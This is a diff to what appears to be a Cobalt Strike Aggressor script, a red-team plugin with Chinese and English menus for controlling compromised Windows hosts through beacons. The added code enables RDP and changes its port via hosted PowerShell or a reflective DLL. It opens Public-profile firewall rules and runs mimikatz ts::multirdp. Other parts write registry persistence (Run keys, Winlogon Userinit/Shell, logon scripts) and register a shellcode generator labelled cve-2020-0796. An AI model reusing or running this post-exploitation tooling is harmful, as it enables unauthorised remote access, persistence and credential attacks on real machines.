@@ -16,7 +16,8 @@ item "设置常用路径" {
 	}
 }
 
-
+# 下拉菜单更新的实现：
+# https://github.com/ruanjian668/CobaltstrikeSource/blob/db9f2ab44805d2e46f1b5387bac00f3a9236b4b6/decomplie_src/cobaltstrike4.1/aggressor/dialogs/ScListenerDialog.java
 menu "文件控制"{  
 	item "文件属性" {
 		local('$bid');
@@ -117,7 +118,7 @@ menu "注册表" {
 	item "添加注册表启动项"{
 		local('$bid');
 		foreach $bid ($1){
-			$Dialog = dialog("Auto Run",%(RegKey => "HKLM", RegItem => "Run", Arch => binfo($bid, "arch") ,  KeyName => "Svchost", CallBackFile => "$filePath" ,bid => $bid),&AddRegAutoRun);
+			$Dialog = dialog("Auto Run",%(RegKey => "HKLM", RegItem => "Run", Arch => binfo($bid, "arch") , KeyName => "Svchost", CallBackFile => "$filePath" ,bid => $bid),&AddRegAutoRun);
 			dialog_description($Dialog, "注册表添加启动项");
 			drow_combobox($Dialog, "RegKey", "Key: ", @("HKLM", "HKCU"));
 			drow_combobox($Dialog, "Arch", "Arch: ", @("x86", "x64"));
@@ -392,12 +393,146 @@ menu "用户操作" {
 }
 
 
-menu "RDP控制" {
-	item "查询RDP端口" {};
-	item "RDP设置" {};
-	item "RDP多用户设置" {};
+menu "RDP Controller" {
+	item "Check Status" {
+		local('$bid $result');
+		foreach $bid ($1){
+			$Dialog = dialog("Check Status",%(type => "breg_queryv",bid => $bid),lambda({
+				local('$type $bid $script $hosted');
+				$type = $3['type'];
+				$bid = $3['bid'];
+				if($type eq "sc_reg_query" ){
+					blog($bid,"Run sc query TermService & breg_queryv")
+					brun($bid,"sc query TermService")
+					breg_queryv($bid, "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server", "fDenyTSConnections", binfo($bid, "arch"))
+				}else if ($type eq "apiscaninfo"){
+					blog($bid,"Scan System information by reflective_dll ...")
+				
+					$Parameter ="RdpInfoScan"."|1|1|1|1|";
+					#bdllspawn!($bid, getFileProper(script_resource("Persistence/modules/"), "/RdpEnable/reflective_dll.dll"),$Parameter, "RdpInfoScan", 5000);
+					
+					bdllspawn!($bid, getFileProper(script_resource("Persistence/modules/"), "/RdpEnable/reflective_dll.dll"),$Parameter, "RdpInfoScan", 5000);
+					
+				}else{
+					
+					
+					
+				}
+			}));
+			dialog_description($Dialog, "");
+			drow_combobox($Dialog, "type", "Methods: ", @("sc_reg_query","apiscaninfo"));
+			dbutton_action($Dialog, "RUN");
+			dialog_show($Dialog);
+		
+		
+		
+			
+		}
+	}
+	
+	item "Find RDP Port" {
+		local('$bid');
+		foreach $bid ($1){
+			$Dialog = dialog("Find RDP Port",%(type => "breg_queryv",bid => $bid),lambda({
+				local('$type $bid $script $hosted');
+				$type = $3['type'];
+				$bid = $3['bid'];
+				if($type eq "powershell" ){
+					$script = "Get-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp' -name \"PortNumber\"";
+					$hosted = beacon_host_script($bid , $script);
+					binput($bid , "powerpick $hosted");
+					bpowerpick!($bid , $hosted);
+					# bpowershell($bid, ' $script '); #360 Hips av stop it.
+				}else if ($type eq "breg_queryv"){
+					breg_queryv($bid, "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp", "PortNumber", binfo($bid, "arch")); 
+				}else{
+					
+				}
+			}));
+			dialog_description($Dialog, "");
+			drow_combobox($Dialog, "type", "Methods: ", @("breg_queryv","powershell"));
+			dbutton_action($Dialog, "RUN");
+			dialog_show($Dialog);
+		}
+	};
+	
+	item "Enable RDP" {
+		local('$bid');
+		foreach $bid ($1){
+			$Dialog = dialog("Set RDP Port",%( type => "powershell",bid => $bid,portvalue => "999"),lambda({
+				local('$type $bid $script $hosted $portvalue $Parameter');
+				$type = $3['type'];
+				$bid = $3['bid'];
+				$portvalue =  int($3['portvalue']);
+				if($portvalue =~ 0){
+					berror($bid,"Int failed!");return;
+				}
 
-
+				if($type eq "powershell_enable_restart" ){
+					blog($bid,"Use PowerShell Enable RDP,Port Set: $portvalue ")
+					@array_script = @("Set-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server' -name \"fDenyTSConnections\" -Value 0;Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp' -name \"PortNumber\" -Value ".$portvalue.";PowerShell New-NetFirewallRule -DisplayName 'RDPPORTLatest-TCP-In' -Profile 'Public' -Direction Inbound -Action Allow -Protocol TCP -LocalPort ".$portvalue.";PowerShell New-NetFirewallRule -DisplayName 'RDPPORTLatest-UDP-In' -Profile 'Public' -Direction Inbound -Action Allow -Protocol UDP -LocalPort ".$portvalue.";restart-service -Force TermService");
+					foreach $script (@array_script){ 
+						$hosted = beacon_host_script($bid , $script);
+						binput($bid , "powerpick $hosted");
+						bpowerpick!($bid , $hosted);
+					}
+				}else if ($type eq "powershell_enable_only"){
+					blog($bid,"Use PowerShell Enable RDP,Port Set: $portvalue ")
+					$script = "Set-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server' -name \"fDenyTSConnections\" -Value 0";
+					$hosted = beacon_host_script($bid , $script);
+					binput($bid , "powerpick $hosted");
+					bpowerpick!($bid , $hosted);
+				}else if($type eq "api_enable_only"){
+					blog($bid,"Set registry to enable rdp by reflective_dll.(Ignore port input)")
+					$Parameter ="api_enable_only"."|3389";
+					bdllspawn!($bid, getFileProper(script_resource("Persistence/modules/"), "/RdpEnable/reflective_dll.dll"),$Parameter, "api_enable_only", 5000);
+				}else if($type eq "api_setfirewall_only"){
+					blog($bid,"Set setfirewall to allow port in by reflective_dll")
+					$Parameter ="api_setfirewall_only"."|".$portvalue;
+					bdllspawn!($bid, getFileProper(script_resource("Persistence/modules/"), "/RdpEnable/reflective_dll.dll"),$Parameter, "api_setfirewall_only", 5000);
+					
+				}else if($type eq "api_startservice_only"){
+					blog($bid,"Just start TermService by reflective_dll.(Ignore port input)")
+					$Parameter ="api_startservice_only"."|".$portvalue;
+					bdllspawn!($bid, getFileProper(script_resource("Persistence/modules/"), "/RdpEnable/reflective_dll.dll"),$Parameter, "api_startservice_only", 5000);
+					
+				}else if($type eq "api_enable_restart"){
+					blog($bid,"Just start TermService by reflective_dll.(Ignore port input)")
+					$Parameter ="api_enable_restart"."|".$portvalue;
+					bdllspawn!($bid, getFileProper(script_resource("Persistence/modules/"), "/RdpEnable/reflective_dll.dll"),$Parameter, "api_enable_restart", 5000);
+				}
+				
+			}));
+			
+			dialog_description($Dialog, "WARNING! powershell_enable_restart and api_enable_restart will be stop current RDP sessions! It will Enable RDP、Set RDP Port、Set FirewallRule And Restart Service.");
+			drow_text($Dialog, "portvalue", "port(number): ");
+			drow_combobox($Dialog, "type", "Methods: ", @("powershell_enable_only","powershell_enable_restart","api_enable_only","api_setfirewall_only","api_startservice_only","api_enable_restart"));
+			dbutton_action($Dialog, "RUN");
+			dialog_show($Dialog);
+		}
+	
+	};
+	
+	item "Mimikatz_Multirdp" {
+		local('$bid');
+		foreach $bid ($1){
+			$Dialog = dialog("Mimikatz_Multirdp",%( bid => $bid ),lambda({
+				local('$bid $arch $pid');
+					$bid  = $3['bid'];
+					$arch = binfo($bid, "arch");
+					$pid  = binfo($bid, "pid");
+					if ($pid >= 0 && ($arch eq "x86" || $arch eq "x64")) {
+						bmimikatz($bid, "privilege::debug", $pid, $arch);
+						bmimikatz($bid, "ts::multirdp", $pid, $arch);
+					} else {
+						bmimikatz($bid, "standard::coffee");
+					}
+			}));
+			dialog_description($Dialog, "Mimikatz ts::multirdp");
+			dbutton_action($Dialog, "RUN");
+			dialog_show($Dialog);
+		}
+	}
 }
 
 menu "启动目录" {
@@ -1556,11 +1691,11 @@ sub AddRegAutoRun{
 		$Reg = $Key.$Prefix.replace($Item,"Winlogon Userinit","Winlogon");
 		if($Arch eq "x86"){
 			blog($bid, "reg add  $+ $Reg /v Userinit /t REG_SZ /d \"C:\\Windows\\system32\\userinit.exe, $+ $File\" /f /reg:32");
-			bshell($bid,"reg add  $+ $Reg /v Userinit /t REG_SZ /d \"C:\\Windows\\system32\\userinit.exe, $+ $File\" /f /reg:32");
+			brun($bid,"reg add  $+ $Reg /v Userinit /t REG_SZ /d \"C:\\Windows\\system32\\userinit.exe, $+ $File\" /f /reg:32");
 		}
 		else{
 			blog($bid, "reg add  $+ $Reg /v Userinit /t REG_SZ /d \"C:\\Windows\\system32\\userinit.exe, $+ $File\" /f /reg:64");
-			bshell($bid,"reg add  $+ $Reg /v Userinit /t REG_SZ /d \"C:\\Windows\\system32\\userinit.exe, $+ $File\" /f /reg:64");
+			brun($bid,"reg add  $+ $Reg /v Userinit /t REG_SZ /d \"C:\\Windows\\system32\\userinit.exe, $+ $File\" /f /reg:64");
 		}
 	}else if($3['RegItem'] eq "Winlogon Shell"){  
 		# 当用户登录后才会执行（可能需要注销-登录触发）,64位系统执行64位注册表位置；32位系统执行32位注册表位置；
@@ -1577,10 +1712,10 @@ sub AddRegAutoRun{
 		$Reg = $Key.$Prefix.replace($Item,"Winlogon Shell","Winlogon");
 		if($Arch eq "x86"){
 			blog($bid, "reg add  $+ $Reg /v Shell /t REG_SZ /d \"explorer.exe, $+ $File\" /f /reg:32");
-			bshell($bid,"reg add  $+ $Reg /v Shell /t REG_SZ /d \"explorer.exe, $+ $File\" /f /reg:32");
+			brun($bid,"reg add  $+ $Reg /v Shell /t REG_SZ /d \"explorer.exe, $+ $File\" /f /reg:32");
 		}else{
 			blog($bid, "reg add  $+ $Reg /v Shell /t REG_SZ /d \"explorer.exe, $+ $File\" /f /reg:64");
-			bshell($bid,"reg add  $+ $Reg /v Shell /t REG_SZ /d \"explorer.exe, $+ $File\" /f /reg:64");
+			brun($bid,"reg add  $+ $Reg /v Shell /t REG_SZ /d \"explorer.exe, $+ $File\" /f /reg:64");
 		}		
 	}else if($3['RegItem'] eq "Logon Scripts"){
 		# SYSTEM(32位)权限下对该注册表项的查询、写入操作都被重定向到32位，加/reg:64也无效。 ,
@@ -1600,10 +1735,10 @@ sub AddRegAutoRun{
 		}
 		if($Arch eq "x86"){
 			blog($bid,"reg add \"HKCU\\Environment\" /v UserInitMprLogonScript /t REG_SZ /d \" $+ $File\" /f /reg:32");
-			bshell($bid,"reg add \"HKCU\\Environment\" /v UserInitMprLogonScript /t REG_SZ /d \" $+ $File\" /f /reg:32");
+			brun($bid,"reg add \"HKCU\\Environment\" /v UserInitMprLogonScript /t REG_SZ /d \" $+ $File\" /f /reg:32");
 		}else{
 			blog($bid,"reg add \"HKCU\\Environment\" /v UserInitMprLogonScript /t REG_SZ /d \" $+ $File\" /f /reg:64");
-			bshell($bid,"reg add \"HKCU\\Environment\" /v UserInitMprLogonScript /t REG_SZ /d \" $+ $File\" /f /reg:64");
+			brun($bid,"reg add \"HKCU\\Environment\" /v UserInitMprLogonScript /t REG_SZ /d \" $+ $File\" /f /reg:64");
 		}
 	}
 	else{
@@ -1612,11 +1747,11 @@ sub AddRegAutoRun{
 			blog($bid,"\c4 KeyName Not Input.");
 		}else{
 			if($Arch eq "x86"){
-				blog($bid,"reg add  $+ $Reg /v $KeyName /t REG_SZ /d \" $+ $File\" /f /reg:32");
-				bshell($bid,"reg add  $+ $Reg /v $KeyName /t REG_SZ /d \" $+ $File\" /f /reg:32");
+				blog($bid,"reg add  $+ $Reg /v $KeyName /t REG_SZ /d \"\\\" $+ $File\"\\\" /f /reg:32");
+				brun($bid,"reg add  $+ $Reg /v $KeyName /t REG_SZ /d \"\\\" $+ $File\"\\\" /f /reg:32");
 			}else{
-				blog($bid,"reg add  $+ $Reg /v $KeyName /t REG_SZ /d \" $+ $File\" /f /reg:64");
-				bshell($bid,"reg add  $+ $Reg /v $KeyName /t REG_SZ /d \" $+ $File\" /f /reg:64");
+				blog($bid,"reg add  $+ $Reg /v $KeyName /t REG_SZ /d \"\\\" $+ $File\"\\\" /f /reg:64");
+				brun($bid,"reg add  $+ $Reg /v $KeyName /t REG_SZ /d \"\\\" $+ $File\"\\\" /f /reg:64");
 			}
 		}
 	}
@@ -2205,3 +2340,19 @@ sub msdtcdll{
 		#drow_listener_stage($Dialog, "listener", "Stage: ");
 	}
 }
+
+
+
+
+######## SHELLCOODE #####
+
+# 生成线程类型的shellcode.
+sub threadshellcode {
+		local('$stager');
+		btask($1, "Task Beacon to run " . listener_describe($2) . " cve-2020-0796");
+		$data =  payload_local($1, $2, "x64", "thread");
+		$handle = openf(">112313212out.bin");
+		writeb($handle, $data);
+		closef($handle);
+	}
+beacon_exploit_register("threadshellcode", "threadshellcode", &threadshellcode);
